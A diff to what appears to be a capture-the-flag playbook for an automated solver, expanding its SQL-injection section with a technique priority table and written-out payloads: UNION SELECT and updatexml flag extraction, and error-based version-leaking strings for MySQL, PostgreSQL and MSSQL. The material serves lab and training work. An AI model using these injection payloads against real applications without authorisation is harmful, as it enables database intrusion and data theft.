@@ -81,12 +81,30 @@ XBEN{...}
 
 **SQLi CTF Pattern**:
 ```
-1. Confirm SQLi exists
-2. Determine DB type
-3. Extract table names
-4. Find flag table/column
-5. Extract flag
+1. Confirm SQLi exists (error or behavioral difference)
+2. ANALYZE CONTEXT: Test for each technique in order of speed:
+   - Is output visible? → UNION SELECT (fastest - 1 request!)
+   - Are errors visible? → Error-based: updatexml(), extractvalue()
+   - Response differs? → Boolean-blind (slower - 50+ requests)
+   - No difference? → Time-based SLEEP (slowest - last resort)
+3. Extract flag directly when possible:
+   - ' UNION SELECT flag,2,3 FROM flags--
+   - ' AND updatexml(1,concat(0x7e,(SELECT flag FROM flags),0x7e),1)--
+4. DO NOT use blind injection if UNION/error-based works!
 ```
+
+**CRITICAL SQLi Technique Priority** (ALWAYS follow this order):
+| Priority | Technique | Speed | Use When |
+|----------|-----------|-------|----------|
+| 1st | UNION SELECT | 1-3 requests | Output visible |
+| 2nd | Error-based (updatexml) | 1-5 requests | Errors visible |
+| 3rd | Boolean-blind | 50-500 requests | Response differs |
+| 4th | Time-based SLEEP | 50-500 requests | Last resort only |
+
+**Error-based payloads by database**:
+- MySQL: `' AND updatexml(1,concat(0x7e,@@version,0x7e),1)--`
+- PostgreSQL: `' AND 1=cast((SELECT version()) as int)--`
+- MSSQL: `' AND 1=convert(int,(SELECT @@version))--`
 
 **SSTI CTF Pattern**:
 ```
